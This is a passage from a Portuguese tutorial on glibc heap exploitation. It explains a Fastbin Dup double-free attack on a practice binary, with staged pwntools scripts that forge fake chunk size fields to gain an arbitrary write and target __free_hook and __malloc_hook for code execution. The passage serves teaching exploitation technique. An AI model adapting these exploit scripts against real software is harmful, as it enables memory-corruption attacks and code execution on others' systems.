        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># indice do chunk alocado
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># # seleciona a funcao "malloc", envia o tamanho e os dados e retorna o indice do chunk
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># seleciona a opcao "free" e envia o indice.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>


<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Este script não diferencia muito do utilizado na exploração do <code class="language-plaintext highlighter-rouge">The House of Force</code>, porém adaptado às opções do menu deste binário.</p>

<p>Vamos adicionar as seguintes linhas ao script para inserirmos um “username”, criar dois <em>chunks</em> e em seguida liberá-los:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"Beco"</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Vamos executar o script incorporando no GDB com a opção NOASLR ativa e inspecionar a <em>heap</em> e o <em>fastbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_116.png" alt="Heap e fastbins" /></p>

<p>Podemos ver os <em>chunks</em> “A” e “B” preenchidos com “A” e “B” respectivamente, e ambos inseridos na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes.<br />
Mais importante, podemos ver que o <em>chunk</em> B está no topo da <em>fastbin</em>, uma vez que foi o ultimo <em>chunk</em> a ser liberado.</p>

<p>O <em>chunk</em> B possui um “forward pointer” que aponta para o <em>chunk</em> A e o <em>chunk</em> A possui um “fd” nulo. O que acontece se liberarmos novamente o chunk A neste momento?</p>

<p>Ele já está registrado na <em>fastbin</em>, portanto teriamos um <em>double free</em>, mais importante, ele não está no topo da <em>fastbin</em>, pois lá está o <em>chunk</em> B, que tem um “fd” que aponta para o <em>chunk</em> A. Vamos seguir com a execução do programa com o comando <code class="language-plaintext highlighter-rouge">continue</code>, mudar para o terminal que está executando o script e tentar liberar o <em>chunk</em> A que está no índice 0.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_117.png" alt="Double free no chunk A" /></p>

<p>A primeira coisa que podemos notar, é que desta vez, o programa não abortou a execução como antes. Voltando ao GDB e pausando a execução, podemos visualizar a <em>heap</em> e a <em>fastbin</em> novamente, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_118.png" alt="Visualizando o double free" /></p>

<p>O <em>chunk</em> A agora está no topo da <em>fastbin</em> e possui um “fd” para o <em>chunk</em> B, e o <em>chunk</em> B ainda tem um “fd” que aponta para o <em>chunk</em> A. Isto torna uma lista não circular em uma lista circular, e podemos ver que o <em>chunk</em> A está registrado na <em>fastbin</em> duas vezes.</p>

<p>Isto mostra que fizemos o <em>bypass</em> da mitigação, conseguindo liberar o mesmo <em>chunk</em> duas vezes, técnica conhecida como <code class="language-plaintext highlighter-rouge">Fastbin Dup</code>.</p>

<h2 id="arbitrary-write-via-fastbin-dup">Arbitrary write via Fastbin Dup</h2>

<p>Agora que a exploração foi entendida, é preciso dar um propósito a ela. Dentro do cenário mostrado, pense na seguinte hipótese:</p>

<blockquote>
  <p>Depois de ter conseguido um <code class="language-plaintext highlighter-rouge">fasbin dup</code> solicitamos mais um <em>chunk</em> do mesmo tamanho, sabemos que o comportamento normal da malloc, é realocar o <em>chunk</em> que está no topo da <em>fastbin</em> ao invés de alocar um novo <em>chunk</em> do <em>top chunk</em>. Neste caso, ele realocaria o <em>chunk</em> A. Então teríamos total controle do <em>user data</em> do <em>chunk</em> A, pois ele foi legitimamente alocado, enquanto o primeiro <em>quadword</em> deste mesmo <em>user data</em> ainda é um “fd” dentro da <em>fastbin</em>.<br />
Isto pode nos permitir adulterar o “fd”, o apontando para um <em>chunk</em> falso que sobrepõe nosso <em>target</em> na própria <em>fastbin</em>.
Então poderíamos requisitar o <em>chunk</em> falso e sobrescrever o <em>target</em>.</p>
</blockquote>

<p>Para pormos em prática a teoria, vamos adicionar algumas linhas em nosso script. A primeira coisa que precisamos fazer, é inserir a chamada para liberar o <em>chunk</em> A novamente para obtermos o <em>fastbin dup</em> <code class="language-plaintext highlighter-rouge">free(chunk_A)</code>, da mesma forma que fizemos manualmente. Depois, podemos requisitar um novo <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, qualquer coisa que adicionarmos no primeiro <em>quadword</em> no <em>data</em> deste <em>chunk</em>, será tratado como um “fd” pela <em>fastbin</em>, pois o <em>chunk</em> A está em dois estados simultâneamente.</p>

<p>Se escrevermos o endereço da estrutura “user” no primeiro <em>quadword</em> do <em>user data</em>, estaremos efetivamente apontando para um <em>chunk</em> falso que sobrepõe nosso <em>target</em> direto na <em>fastbin</em>. O bloco de exploração ficou desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">#===============EXPLOITING================#
</span> 
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"Beco"</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks e criando o gastbin dup
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para "user"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Vamos executar nosso script atrelado ao GDB e inspecionar a <em>heap</em> e o <em>fastbin</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_119.png" alt="Heap e fastbins" /></p>

<p>Podemos ver que o <em>chunk</em> B agora está no topo da pilha da <em>fastbin</em>, seguido pelo <em>chunk</em> A cujo “fd” aponta para a estrutura “user” agora. A partir de agora, se solicitarmos mais um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, vamos realocar o <em>chunk</em> B, e se solicitarmos mais um, vamos realocar o <em>chunk</em> A novamente e então, na terceira solicitação, vamos sobrescrever a <em>target</em>, pois o <em>chunk</em> A aponta para ela.</p>

<p>Adicionando estas requisições ao script, o bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"Beco"</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para "user"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora, podemos executar o script pelo GDB normalmente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_120.png" alt="GDB parou execução" /></p>

<p>Conforme podemos ver, o GDB parou a execução imediatamente. No painel <em>backtrace</em> podemos ver que a função <code class="language-plaintext highlighter-rouge">abort()</code> foi chamada novamente.</p>

<p>Utilizando os comandos <code class="language-plaintext highlighter-rouge">frame 4</code> e <code class="language-plaintext highlighter-rouge">context code</code> novamente, podemos ver o código responsável pelo erro.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_121.png" alt="Linha de código da mensagem de erro" /></p>

<p>Desta vez, a mensagem “<em>malloc(): memory corruption (fast)</em>” é mais crítica que a anterior. Este código não está comentado, mas podemos observar que ele compara os tamanhos do <em>size field</em> do <em>chunk</em> que será alocado é mosmo do tamanho da <em>fastbin</em> de onde ele irá alocar.</p>

<p>Afinal, faz muito sentido um <em>chunk</em> de tamanho diferente, como por exemplo um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x80</code> bytes não conseguir ser alocado na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, pois a <em>fastbin</em> trabalha com <em>chunks</em> de tamanhos específicos.</p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">dq</code> para inspecionar a estrutura da “user”, podemos ver que seu <em>size field</em> é 0, conforme ilustrado na imagem abaixo, explicando o erro na execução.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_122.png" alt="Size field zerado" /></p>

<p>Porém, o comando <code class="language-plaintext highlighter-rouge">ptype</code> que utilizamos anteriormente, nos lembra que o usuário tem controle em um pedaço da memória, justamente onde inserimos o “username”, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_123.png" alt="Estrutura da user" /></p>

<p>E se inserirmos em “username” um <em>size field</em> falso?<br />
Inserindo no lugar do “username” um <em>quadword</em> nulo para preencher a primeira parte, mais um <em>size field</em> falso utilizando a função <code class="language-plaintext highlighter-rouge">p64()</code> do pwntools, podemos preencher o segundo <em>quadword</em> com o <em>size field</em> esperado.<br />
Vamos adicionar no script ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para "user"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Ao executermos com o GDB, podemos observar que ele não encerrou a execução. Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">dq</code> para visualizarmos o resultado, veremos um <em>size field</em> falso compatível com nossa fastbin.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_124.png" alt="Size field falso" /></p>

<p>Podemos continuar o fluxo de execução no GDB com o comando <code class="language-plaintext highlighter-rouge">continue</code>, voltarmos para o terminal de execução do script e escolher a opção três, para visualizarmos o <em>target</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_125.png" alt="Arbitrary write com sucesso" /></p>

<blockquote>
  <p>Em resumo, este binário possui uma vulnerabilidade de <code class="language-plaintext highlighter-rouge">double free</code> que nos permitiu liberar o mesmo <em>chunk</em> duas vezes na <em>fastbin</em>. Fomos capazes de efetuar o <em>bypass</em> da mitigação nos certificando que o <em>chunk</em> alvo não estivesse no <em>top chunk</em> da <em>fastbin</em> para liberá-lo pela segunda vez.<br />
Depois requisitamos este <em>chunk</em> duplicado e escrevemos um “fd” que aponta para um <em>chunk</em> falso, sobrescrevendo a memória alvo no primeiro <em>quadword</em> do <em>user data</em>. Então requisitamos noso <em>chunk</em> falso da <em>fastbin</em> e o usamos para sobrescrever os dados alvo.<br />
Fomos capazes de efetuar o <em>bypass</em> da comparação dos <em>size fields</em> , utilizando um campo onde o usuário tem controle para criar um <em>size field</em> falso.</p>
</blockquote>

<h2 id="execução-de-código-via-fastbin-dup">Execução de código via Fastbin Dup</h2>

<p>A partir do momento em que é possível controlar o fluxo de um programa, as chances de sucesso ao tentar executar um código são grandes. E este é o objetivo principal com este binário.</p>

<p>Assim como na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>, nosso alvo será a <code class="language-plaintext highlighter-rouge">malloc hooks</code> da qual sua chamada pode usada para interceptar as chamadas para funções do <em>core</em> da malloc.</p>

<p>Este binário nos permite chamar a função <code class="language-plaintext highlighter-rouge">free()</code>, que tem a vantagem de ter como único argumento, o <em>chunk</em> que será liberado, que por sua vez possui um “fd” em seu <em>user data</em>, tornando possível sovrescrevê-lo com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> da própria GLIBC, depois liberando um <em>chunk</em> que contenha nossa <em>string</em> de comando, possibilitando passar este comando para <code class="language-plaintext highlighter-rouge">system()</code>.</p>

<p>Para testarmos esta teoria, podemos fazer uma cópia do script para <em>arbitrary write</em> e fazer algumas alterações.</p>

<p>A primeira coisa que precisamos editar, é a requisição que sobrescreve o <em>data section</em> do binário contendo a <em>target</em>, alterando para o endereço da <code class="language-plaintext highlighter-rouge">free_hook()</code> menos 16 bytes.</p>

<blockquote>
  <p>Lembre-se que a malloc trata um <em>chunk</em> como uma sequência de bytes que se inicia 16 bytes antes do campo <em>user data</em>. Portanto, inserindo o endereço da <code class="language-plaintext highlighter-rouge">free_hook()</code> menos 16 bytes, o primeiro <em>quadword</em> do <em>chunk</em> falso irá sobrescrever o <code class="language-plaintext highlighter-rouge">free_hook()</code>.</p>
</blockquote>

<p>A segunda coisa que precisamos editar, é a solicitação na qual requisitamos o <em>chunk</em>          falso e escrevemos seu <em>user data</em>. No caso anterior, alteramos o seu conteúdo para “BecoXPL”, porém, desta vez queremos sobrescrevê-lo com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> da GLIBC.</p>

<p>O bloco de exploração do script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para o "free_hook()"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mi">16</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "free_hook()"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "free_hook()"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora podemos executar o script atrelado ao GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_126.png" alt="Erro na execução" /></p>

<p>Aparentemente algo deu errado e recebemos a chamada para a função <code class="language-plaintext highlighter-rouge">abort()</code> na execução.<br />
Alterando para o frame <code class="language-plaintext highlighter-rouge">_int_malloc()</code> e visualizando o código, podemos verificar o mesmo erro que já vimos na situação passada.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_127.png" alt="Código que aciona o erro" /></p>

<p>É o mesmo erro que ocorre quando o <em>size field</em> do <em>chunk</em> falso tenta ser alocado em uma <em>fastbin</em> de outeo tamanho.<br />
Quando utilizamos o comando <code class="language-plaintext highlighter-rouge">dq</code> fica claro o motivo, o <em>chunk</em> falso se encontra ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_128.png" alt="Chunk falso" /></p>

<p>E seu <em>size field</em> se encontra ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_129.png" alt="Size field do chunk falso" /></p>

<p>Assim como na exploração anterior, nos deparamos com um <em>size field</em> nulo, porém, desta vez, não temos o controle para alterá-lo. E além disso, não existe nenhum campo que possa ser usado ao redor desta posição, que possa ser utilizado como <em>size field</em>.<br />
Portanto, aparentemente, a <code class="language-plaintext highlighter-rouge">free_hook()</code> não é uma boa opção para utilizarmos. Podemos voltar para a alternativa da exploração anterior, onde utilizamos a <code class="language-plaintext highlighter-rouge">malloc hook</code>.</p>

<p>Inspecionando a memória ao redor da <code class="language-plaintext highlighter-rouge">malloc hook</code> podemos ver sua posição, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_130.png" alt="Posiçào da malloc hook" /></p>

<p>E ao observar a resposta, podemos ver que existem alguns endereços ao redor, mas nenhum deles aparenta ser um <em>size field</em> válido, pois todos estes valores são muito altos.<br />
Porém, o PWNDBG nos permite procurar por <em>chunks</em> que se qualificam para os <em>fastbins</em>. O comando <code class="language-plaintext highlighter-rouge">find_fake_fast</code> nos permite fazer esta procura.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_131.png" alt="Encontrando um possível chunk falso" /></p>

<p>Aparentemente encontramos um candidato a <em>chunk</em> falso no endereço <code class="language-plaintext highlighter-rouge">0x7ffff7dd0b2d</code>, podemos calcular a distância entre a <code class="language-plaintext highlighter-rouge">malloc hook</code> e o candidato a <em>chunk</em> falso com o comando <code class="language-plaintext highlighter-rouge">distance</code>, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_132.png" alt="Distância entre o endereços" /></p>

<p>Conforme podemos observar, o candidato a <em>chunk</em> falso está <code class="language-plaintext highlighter-rouge">0x23</code> bytes (35 bytes) antes da <code class="language-plaintext highlighter-rouge">malloc hook</code><br />
Podemos visualizar melhor como o PWNDBG chegou a este resultado, utilizando o comando <code class="language-plaintext highlighter-rouge">dq</code> para visualizar o <em>dump</em> deste endereço, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_133.png" alt="Dump do chunk falso" /></p>

<p>Aparentemente o PWNDBG forçou um <em>size field</em> de tamanho <code class="language-plaintext highlighter-rouge">0x7f</code> desalinhando um dos endereços de memória existentes antes da <code class="language-plaintext highlighter-rouge">malloc hook</code>. Este <em>size field</em> é composto dos três bytes mais significantes do <em>quadword</em> mostrado abaixo e os cinco bytes menos significantes do quadword seguinte, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_134.png" alt="Dump do chunk falso" /></p>

<blockquote>
  <p>O GDB nos mostra os bytes em <em>little endian</em>, o que significa que são mostrados na ordem reversa.</p>
</blockquote>

<p>Utilizando o comando <code class="language-plaintext highlighter-rouge">dump bytes</code> ou simplesmente <code class="language-plaintext highlighter-rouge">db</code>, o GDB nos mostra o mapa da memória, que pode nos ajudar a visualizar o endereço, mostrando o <code class="language-plaintext highlighter-rouge">0x7f</code> seguido de bytes nulos, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_135.png" alt="Mapa da memória" /></p>

<p>Olhando pela perspectiva da malloc, podemos utilizar este endereço, pois ela não checa o alinhamento do endereço, nem checa se as <em>flags</em> do chunk são válidas. Algumas combinações de <em>flags</em> podem causar um <em>crash</em>, porém, o <code class="language-plaintext highlighter-rouge">0f</code> funciona perfeitamente (<em>flags</em> são descritas nas seções anteriores).</p>

<p>Porém, existe um conhecimento importante nesta situação, em condições de produção este binário será submetido ao ASLR, o que significa que os endereços serão randômicos em toda a execução do programa.<br />
No entanto, na arquitetura <strong>x86</strong> da maioria das plataformas Linux, as bibliotecas sempre são mapeadas com endereços iniciados em <code class="language-plaintext highlighter-rouge">0x00007f</code>. E o endereço que estamos utilizando, que se inicia com o byte <code class="language-plaintext highlighter-rouge">0x7f</code>, faz parte da funcionalidade padrão <code class="language-plaintext highlighter-rouge">I/O</code>. Podemos confirmar com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_136.png" alt="Mapa da memória" /></p>

<p>Além disso, o <em>quadword</em> sequinte composto de zeros, é um <em>qwadword</em> de alinhamento que necessariamente será sempre nulo. Portanto, mesmo em condições de produção, sempre será possível obter este <em>size field</em> seguido de bytes nulos.</p>

